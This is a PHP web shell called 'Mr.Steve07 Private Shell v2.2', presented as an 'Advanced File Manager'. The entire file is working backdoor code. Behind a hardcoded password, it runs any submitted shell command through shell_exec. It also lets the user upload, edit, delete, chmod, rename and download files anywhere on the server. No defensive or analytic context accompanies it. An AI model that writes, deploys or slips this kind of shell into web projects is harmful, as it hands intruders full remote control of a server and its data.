<?php
$password = "007";   // ← CHANGE THIS!

$home_dir = $_SERVER['DOCUMENT_ROOT'];
$current_dir = isset($_GET['dir']) ? realpath($_GET['dir']) ?: $home_dir : $home_dir;
if (!is_dir($current_dir)) $current_dir = $home_dir;

if (!isset($_REQUEST['pass']) || $_REQUEST['pass'] !== $password) {
    die("Access Denied");
}

// ====================== COPY & PASTE ======================
session_start();
if (isset($_POST['action']) && $_POST['action'] === 'copy' && !empty($_POST['selected'])) {
    $_SESSION['copied_items'] = [];
    foreach ($_POST['selected'] as $item) {
        $_SESSION['copied_items'][] = $current_dir . '/' . $item;
    }
    echo "<script>alert('✅ Copied " . count($_POST['selected']) . " item(s)!');</script>";
}

if (isset($_POST['action']) && $_POST['action'] === 'paste' && !empty($_SESSION['copied_items'])) {
    foreach ($_SESSION['copied_items'] as $source) {
        $dest = $current_dir . '/' . basename($source);
        if (is_dir($source)) {
            if (!is_dir($dest)) mkdir($dest, 0755, true);
        } else {
            copy($source, $dest);
        }
    }
    echo "<script>alert('✅ Pasted successfully!');</script>";
}

// ====================== UPLOAD ======================
$upload_messages = [];
if (isset($_FILES['files'])) {
    foreach ($_FILES['files']['name'] as $i => $name) {
        if ($_FILES['files']['error'][$i] == 0) {
            $target = $current_dir . '/' . basename($name);
            if (move_uploaded_file($_FILES['files']['tmp_name'][$i], $target)) {
                $upload_messages[] = "✅ Uploaded: <b>$name</b>";
            } else {
                $upload_messages[] = "❌ Failed: $name";
            }
        }
    }
}

// ====================== ACTIONS ======================
if ($_SERVER['REQUEST_METHOD'] === 'POST' && !isset($_FILES['files'])) {
    $action = $_POST['action'] ?? '';

    if ($action === 'bulk_delete' && !empty($_POST['selected'])) {
        foreach ($_POST['selected'] as $item) {
            $target = $current_dir . '/' . $item;
            is_dir($target) ? @rmdir($target) : @unlink($target);
        }
    }

    if ($action === 'bulk_chmod' && !empty($_POST['selected']) && isset($_POST['perm'])) {
        foreach ($_POST['selected'] as $item) {
            @chmod($current_dir . '/' . $item, octdec($_POST['perm']));
        }
    }

    if ($action === 'bulk_rename' && !empty($_POST['selected']) && !empty($_POST['prefix'])) {
        foreach ($_POST['selected'] as $item) {
            $old = $current_dir . '/' . $item;
            $new = $current_dir . '/' . $_POST['prefix'] . $item;
            @rename($old, $new);
        }
    }

    if ($action === 'save' && isset($_POST['target']) && isset($_POST['content'])) {
        $filepath = $current_dir . '/' . basename($_POST['target']);
        file_put_contents($filepath, $_POST['content']);
        echo "<script>alert('File saved successfully!');</script>";
    }

    if ($action === 'mkdir' && !empty($_POST['foldername'])) {
        mkdir($current_dir . '/' . basename($_POST['foldername']), 0755, true);
    }
}

// Command Execution
$cmd_output = '';
if (!empty($_POST['command'])) {
    chdir($current_dir);
    $cmd_output = shell_exec($_POST['command'] . " 2>&1");
}
?>

<!DOCTYPE html>
<html>
<head>
    <title>Mr.Steve07 Private Shell v2.2</title>
    <style>
        body { background:#0a0a0a; color:#00ff00; font-family:'Courier New', monospace; margin:0; padding:15px; }
        .header { border:2px solid #00ff00; padding:20px; text-align:center; background:#000; margin-bottom:20px; border-radius:5px; }
        .logo { font-size:32px; font-weight:bold; letter-spacing:6px; text-shadow:0 0 10px #00ff00; }
        button, input[type="submit"] { background:#111; color:#00ff00; border:1px solid #00ff00; padding:8px 14px; margin:4px; cursor:pointer; border-radius:3px; }
        input[type="text"], input[type="file"] { background:#111; color:#00ff00; border:1px solid #00ff00; padding:8px; }
        table { width:100%; border-collapse:collapse; margin-top:15px; background:#111; }
        th, td { border:1px solid #00aa00; padding:10px; }
        th { background:#002200; }
        .folder { color:#66ff66; cursor:pointer; font-weight:bold; }
        .file { cursor:pointer; color:#00ccff; }
        .output { background:#000; border:1px solid #00ff00; padding:15px; white-space:pre-wrap; max-height:500px; overflow:auto; margin-top:10px; }
        .message { background:#002200; padding:10px; margin:10px 0; border-left:4px solid #00ff00; }
    </style>
    <script>
        function selectAll(source) {
            var checkboxes = document.getElementsByName('selected[]');
            for(var i = 0; i < checkboxes.length; i++) checkboxes[i].checked = source.checked;
        }
    </script>
</head>
<body>

<div class="header">
    <div class="logo">Mr.Steve07 Private Shell v2.2</div>
    <p>Advanced File Manager CODED BY MR.STEVE07</p>
</div>

<p>
    <strong>Current DIR:</strong> <?= htmlspecialchars($current_dir) ?> 
    | <a href="?pass=<?= urlencode($password) ?>&dir=<?= urlencode(dirname($current_dir)) ?>" style="color:#00ff00">↑ Go Up</a>
    | <a href="?pass=<?= urlencode($password) ?>&dir=<?= urlencode($home_dir) ?>" style="color:#00ff88; font-weight:bold;">🏠 HOME</a>
</p>

<!-- Upload -->
<h3>Upload Files (Multiple Supported):</h3>
<?php if (!empty($upload_messages)): ?>
    <div class="message"><?= implode("<br>", $upload_messages) ?></div>
<?php endif; ?>

<form method="post" enctype="multipart/form-data">
    <input type="hidden" name="pass" value="<?= htmlspecialchars($password) ?>">
    <input type="hidden" name="dir" value="<?= htmlspecialchars($current_dir) ?>">
    <input type="file" name="files[]" multiple>
    <input type="submit" value="Upload Files">
</form>

<!-- Create Folder -->
<form method="post" style="display:inline;">
    <input type="hidden" name="pass" value="<?= htmlspecialchars($password) ?>">
    <input type="hidden" name="dir" value="<?= htmlspecialchars($current_dir) ?>">
    <input type="hidden" name="action" value="mkdir">
    <input type="text" name="foldername" placeholder="New Folder Name">
    <input type="submit" value="Create Folder">
</form>

<!-- Command Execution -->
<div style="background:#000; border:1px solid #00ff00; padding:15px; margin:15px 0;">
    <strong>Command Execution:</strong><br><br>
    <form method="post">
        <input type="hidden" name="pass" value="<?= htmlspecialchars($password) ?>">
        <input type="hidden" name="dir" value="<?= htmlspecialchars($current_dir) ?>">
        <input type="text" name="command" style="background:#000;color:#00ff00;border:2px solid #00ff00;padding:10px;width:75%;" placeholder="ls -la || whoami">
        <input type="submit" value="Execute" style="padding:10px 20px;">
    </form>
</div>

<?php if ($cmd_output): ?><pre class="output"><?= htmlspecialchars($cmd_output) ?></pre><?php endif; ?>

<hr>

<h3>File Manager</h3>

<form method="post">
    <input type="hidden" name="pass" value="<?= htmlspecialchars($password) ?>">
    <input type="hidden" name="dir" value="<?= htmlspecialchars($current_dir) ?>">

    <!-- Bulk Action Bar -->
    <button type="submit" name="action" value="bulk_delete" onclick="return confirm('Delete selected?')">🗑 Bulk Delete</button>
    <button type="submit" name="action" value="zip_selected" onclick="return confirm('Zip selected?')">📦 Zip Selected</button>
    
    <input type="text" name="perm" value="0777" size="6" style="width:70px;">
    <button type="submit" name="action" value="bulk_chmod">CHMOD</button>

    <input type="text" name="prefix" value="Prefix_" size="10">
    <button type="submit" name="action" value="bulk_rename">Bulk Rename</button>

    <button type="submit" name="action" value="copy">📋 Copy</button>
    <button type="submit" name="action" value="paste">📌 Paste</button>

    <button type="button" onclick="selectAll(this)">Select All</button>

    <table>
        <tr>
            <th><input type="checkbox" onclick="selectAll(this)"></th>
            <th>Name</th>
            <th>Type</th>
            <th>Size</th>
            <th>Permission</th>
            <th>Actions</th>
        </tr>
        <?php
        $items = scandir($current_dir);
        // Folders first
        foreach ($items as $file) {
            if ($file == '.' || $file == '..') continue;
            $fullpath = $current_dir . '/' . $file;
            if (!is_dir($fullpath)) continue;
        ?>
        <tr>
            <td><input type="checkbox" name="selected[]" value="<?= htmlspecialchars($file) ?>"></td>
            <td><a href="?pass=<?= urlencode($password) ?>&dir=<?= urlencode($fullpath) ?>" class="folder">📁 <?= htmlspecialchars($file) ?></a></td>
            <td>Folder</td>
            <td>-</td>
            <td><?= substr(sprintf('%o', @fileperms($fullpath)), -4) ?></td>
            <td></td>
        </tr>
        <?php } ?>

        <!-- Files -->
        <?php
        foreach ($items as $file) {
            if ($file == '.' || $file == '..') continue;
            $fullpath = $current_dir . '/' . $file;
            if (is_dir($fullpath)) continue;
            $size = round(@filesize($fullpath)/1024, 2) . ' KB';
            $perm = substr(sprintf('%o', @fileperms($fullpath)), -4);
        ?>
        <tr>
            <td><input type="checkbox" name="selected[]" value="<?= htmlspecialchars($file) ?>"></td>
            <td><a href="?pass=<?= urlencode($password) ?>&dir=<?= urlencode($current_dir) ?>&edit=<?= urlencode($file) ?>" class="file">📄 <?= htmlspecialchars($file) ?></a></td>
            <td>File</td>
            <td><?= $size ?></td>
            <td><?= $perm ?></td>
            <td><a href="?pass=<?= urlencode($password) ?>&dir=<?= urlencode($current_dir) ?>&download=<?= urlencode($file) ?>">Download</a></td>
        </tr>
        <?php } ?>
    </table>
</form>

<!-- Edit Section -->
<?php if (isset($_GET['edit'])): 
    $edit_file = basename($_GET['edit']);
    $filepath = $current_dir . '/' . $edit_file;
    $content = file_exists($filepath) ? file_get_contents($filepath) : '';
?>
<hr>
<h3>Editing: <?= htmlspecialchars($edit_file) ?></h3>
<form method="post">
    <input type="hidden" name="pass" value="<?= htmlspecialchars($password) ?>">
    <input type="hidden" name="dir" value="<?= htmlspecialchars($current_dir) ?>">
    <input type="hidden" name="action" value="save">
    <input type="hidden" name="target" value="<?= htmlspecialchars($edit_file) ?>">
    <textarea name="content" rows="30" style="width:100%; background:#000; color:#00ff00; border:1px solid #00ff00;"><?= htmlspecialchars($content) ?></textarea><br><br>
    <button type="submit">Save File</button>
    <a href="?pass=<?= urlencode($password) ?>&dir=<?= urlencode($current_dir) ?>" style="color:#00ff00">Cancel</a>
</form>
<?php endif; ?>

<!-- Download Handler -->
<?php
if (isset($_GET['download'])) {
    $file = $current_dir . '/' . basename($_GET['download']);
    if (file_exists($file) && is_file($file)) {
        header('Content-Description: File Transfer');
        header('Content-Type: application/octet-stream');
        header('Content-Disposition: attachment; filename="'.basename($file).'"');
        header('Content-Length: ' . filesize($file));
        readfile($file);
        exit;
    }
}
?>

</body>
</html>